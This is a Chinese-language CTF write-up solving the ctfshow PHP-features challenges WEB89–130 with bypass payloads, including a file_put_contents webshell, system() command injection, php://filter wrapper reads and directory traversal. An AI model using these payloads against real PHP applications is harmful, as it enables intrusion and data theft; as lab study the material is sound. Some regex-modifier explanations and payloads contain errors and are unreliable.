# PHP特性

## WEB89 考点：intval函数

![web89](/img/web89.png)

intval函数当传入的变量也是数组的时候，会返回1

payload:?num[]=1

## WEB90 考点：intval函数

![WEB90](/img/web90.png)

方法1：

intval($var,$base)，其中var必填，base可选，这里base=0,则表示根据var开始的数字决定使用的进制： 0x或0X开头使用十六进制，0开头使用八进制，否则使用十进制。 这里===表示类型和数值必须相等，我们可以使用4476的八进制或十六进制绕过检测。 paylod：num=010574或num=0x117c

方法2：

$unm==="4467"是字符串比较

intval($num,0)===4476是数字比较在比较时会将两边转换为同类型所以

payload：num=4467A

## WEB91  考点 preg_match 

![WEB91](/img/WEB91.png)

考点 preg_match 中/i 表示不区分大小写 /m 表示匹配换行

所以用%0a（换行绕过）

payload：cmd=php%0a123

补充：

- `g`：全局匹配模式。通常情况下，正则表达式只会匹配第一个符合条件的结果，添加 `g` 修饰符后，可以匹配所有符合条件的结果。
- `s`：单行模式。默认情况下，`.` 不会匹配换行符 `\n`，添加 `s` 修饰符后，`.` 会匹配任意字符，包括换行符。
- `x`：忽略空白模式。添加 `x` 修饰符后，在正则表达式中可以使用空格和注释，这样可以增加正则表达式的可读性。
- `u`：Unicode 模式。在处理 Unicode 字符的时候，添加 `u` 修饰符可以正确处理多字节字符。
- `e`：替换模式。该修饰符仅适用于替换函数（如 `preg_replace()`）。它允许将替换字符串作为可执行的 PHP 代码使用。
- `A`：开启锚点模式。默认情况下，`^` 和 `$` 只匹配整个字符串的开头和结尾位置，添加 `A` 修饰符后，它们还可以匹配每一行的开头和结尾位置。
- `D`：非重叠模式。当使用 `preg_match_all()` 函数进行全局匹配时，添加 `D` 修饰符后，可以排除重叠的结果。



## WEB92

同90

## WBE93

同90

## WEB94 考点：intval

![WEB94](/img/WEB94.png)

开头不能为0且a-z都被限制，但是第一个比较是字符串比较而intval是取整数比较所以通过构造小数绕过

payload：?num=4476.0

## WEB95 考点：审计



![WEB95](/img/WEB95.png)

额小数点也被正则了

那么从第三个if中的strpos入手（strpos：返回寻找到的第一个位置）

题目中如果用八进制进行绕过（010574）第一个0的位置在第0位返回！0=1执行die

通过构造没用的东西在前面让0到第一个位置

payload：?num=%0a010574

payload：?num=+010574

## WEB96 考点：highlight_file

![WEB96](/img/WEB96.png)

`highlight_file`里面表示的是文件路径,可以用`./`表示当前目录,或者用绝对路径

payload：u=./flag.php

## WEB97 MD5绕过

![image-20230717155319182](C:\Users\95767\AppData\Roaming\Typora\typora-user-images\image-20230717155319182.png)

数组绕过

payload：a[]=1&b[]=2

## WEB98 审计

![WEB98](/img/WEB98.png)

第一个判断是一个三元表达式，如果get为true则get和post指向同一个地址否则返回flag

那么根据最后一个三元表达式要使HTTP_FLAG=flag才能返回flag

那么通过一个和表达式构造get 1=1 使get和post指向同一个地址

然后post传入HTTP_FLAG=flag得到flag

payload：？1=1   post：HTTP_FLAG=flag

## WEB99  file_put_contents

![99](/img/99.png)

审计。。file_put_contents原来把第二个参数的值写道第一个参数中可以原来创建一个新的文件写入一句话。

get（n）中的值需要在随机数36--877中随机数从1-36开始即构造一个1.php

payload：

get:?n=1.php

post:	content=<?php eval($_POST['a'];)>

访问到1.php后post：a=system('ls');a=system(tac flag36d)		

## WEB100 审计

![100](/img/100.png)

源码分析：

$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);涉及比较符优先级（&& > || > = > and > or）=优先级最高所以要v0=1则v1为数字

第一个判断里v2不能有分号（；）

第二个判断里v3必须有分号（；）

payload：?v1=1&v2=system("ls")&v3=;

​					?v1=1&v2=system("tac ctfshow.php")&v3=;

## WEB101 反射api

![101](/img/101.png)

消除了100的非预期。。

思路：反射API

- ReflectionClass：一个反射类，功能十分强大，内置了各种获取类信息的方法，创建方式为new ReflectionClass(str 类名)，可以用echo new ReflectionClass('className')打印类的信息。
- ReflectionObject：另一个反射类，创建方式为new ReflectionObject(对象名)。

payload：?v1=1&v2=echo new Reflectionclass&v3=;

## WEB102 审计

![102](/img/102.png)

v4为1 只要v2全为数字

[substr](https://so.csdn.net/so/search?q=substr&spm=1001.2101.3001.7020)(string,start<,length>)从string 的start位置开始提取字符串

call_user_func（a,b）：将b作为参数传入a中执行，返回调用函数的返回值

file_put_contents()：把一个字符串写入文件，如果文件不存在则创建之。

payload：

（get）v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php

（post）

v1=hex2bin

（115044383959474e6864434171594473这一串数字有些巧妙，这是16进制与字符串之间的互转，转换为16进制后的字符串，他其中又带有e也会被当做科学计数法，在这个题目中，结合hex2bin函数，从第3的数字读取转换为字符串正好就是<?=`cat *`;   实在是太妙了）

## WEB103

同102

## WEB104 sha1绕过

![104](/img/104.png)

弱比较，数组绕过

payload:?v2[]=1,v1[]=1

## WEB105 考点变量覆盖

![105](/img/105.png)

考点变量覆盖

因为`if(!($_POST['flag']==$flag)){ die($error); }`,
 只要不成立就会输出`$error`,我们可以在GET把flag赋值给suces,然后再把suces赋值给error就能显示flag了

payload：（get）?suces=flag  （post）error=suces

## WEB106

同104

## WEB107  弱比较

![107](/img/107.png)

parse_str — 将字符串解析成多个变量

构造弱比较绕过

payload：（get）?v3[]=0 （post）v1="flag=0"



## WEB108 考点ereg的%00截断

![108](/img/108.png)

考点ereg的%00截断

关于ereg：ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配

payload：?c=a%00778

## WEB109 考点类利用

![109](/img/109.png)

考点类利用

exception：返回字符串

payload：/?v1=exception&v2=system('tac fl36dg.txt')

## WEB110  php内置类 利用

![110](/img/110.png)

考察：php内置类 利用 FilesystemIterator 获取指定目录下的所有文件 http://phpff.com/filesystemiterator https://www.php.net/manual/zh/class.filesystemiterator.php getcwd()函数 获取当前工作目录 返回当前工作目录

 payload: ?v1=FilesystemIterator&v2=getcwd


## WEB111  变量覆盖

<img src="/img/111.png" alt="111" style="zoom:67%;" />

php中$GLOBALS的用法是引用是全局作用域中的可用的全部变量，例如【$GLOBALS["foo"]】。$GLOBALS是一个包含了全部变量的全局组合数组。

思路v1固定为ctfshow，在eval中可将v2的值赋给v1

利用GLOBALS打印代码中所有全局变量

payload：?v1=ctfshow&v2=GLOBALS

## WEB112  php伪协议

![112](/img/112.png)

思路file不能是一个文件且要执行highlight_file,考虑伪协议

ba64，rot13等被正则

payload: file=php://filter/resource=flag.php

其他姿势：

payload: file=php://filter/read=convert.quoted-printable-encode/resource=flag.php
payload: file=compress.zlib://flag.php
payload: file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php
payload:file=php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35/resource=flag.php（对过滤器两次url编码）

## WEB113

同102

payload：payload: file=compress.zlib://flag.php

## WEB114

同102

## WEB115 审计trim

![115](/img/115.png)

要求num不能为36且在filter出来后为36

搜索了一下发现trim不会对%0c进行处理

payload：?num=%0c36

## WEB123 字符串解析特性

![123](/img/123.png)

要求传入一个CTF_SHOW和一个CTF_SHOW.COM但是php通过get和post穿传时变量名中的(.,+,空格)会变成_

但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换

借鉴：https://blog.csdn.net/solitudi/article/details/120502141

payload：CTF_SHOW=&CTF[SHOW.COM=&fun=echo $flag

## WEB125

和123差不多但是过滤了flag和echo

从eval入手利用highlight_file回显flag

GET:?mumuzi=flag.php

POST:CTF_SHOW=&CTF[SHOW.COM=&fun=highlight_file($_GET[mumuzi])

## WEB126

![126](/img/126.png)

非预期：通过$_REQUEST的参数逃逸

payload：get: ?0=var_export($GLOBALS);
post: CTF_SHOW=1&CTF[SHOW.COM=1&fun=eval($_REQUEST[0])



## WEB127 变量覆盖

![127](/img/127.png)

要求ctf_show=ilove36d

extract() 函数从数组中将变量导入到当前的符号表，使用数组键名作为变量名，使用数组键值作为变量值

+和【都被过滤用空客代替

payload:?ctf show=ilove36d

## WEB128

```php
error_reporting(0);
include("flag.php");
highlight_file(__FILE__);

$f1 = $_GET['f1'];
$f2 = $_GET['f2'];

if(check($f1)){
    var_dump(call_user_func(call_user_func($f1,$f2)));
}else{
    echo "嗯哼？";
}

function check($str){
    return !preg_match('/[0-9]|[a-z]/i', $str);
}
```

call_user_func() 函数用于调用方法或者变量，第一个参数是被调用的函数，第二个是调用的函数的参数。

关于：

```
<?php
echo gettext("dotastnb");
//输出结果：dotastnb

echo _("ctfshownb");
//输出结果：ctfshownb
```

f1可以为__，即call_user_func(’_’,‘dotastnb’)就可以输出dotastnb

用到一个get_defined_vars

解释：get_defined_vars ( void ) : array 函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。



payload：?f1=_&f2=get_defined_vars

内部执行过程：

```
var_dump(call_user_func(call_user_func($f1,$f2)));
var_dump(call_user_func(call_user_func(_,'get_defined_vars')));
var_dump(call_user_func(get_defined_vars));//输出数组
```

## WEB129

```
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['f'])){
    $f = $_GET['f'];
    if(stripos($f, 'ctfshow')>0){
        echo readfile($f);
    }
}
```

思路：第二个判断中f要包含ctfshow

通过目录穿越

payload：?f=/ctfshow/../../../var/www/html/flag.php

非预期：

?f=php://filter/ctfshow/resource=flag.php

## WEB130

```
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = $_POST['f'];
    if(preg_match('/.+?ctfshow/is', $f)){  
        die('bye!');
    }
    if(stripos($f, 'ctfshow') === FALSE){
        die('bye!!');
    }
    echo $flag;
} 
```

第一个正则中表示ctfshow前面不能有东西

第二个if判断ctfshow的位置不能为flase（可能想不让ctfshow在第0位可是===会判断类型使用0===flast为0）

```payload
payload：POST:f=ctfshow
```

实际考点：

PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit
 回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false
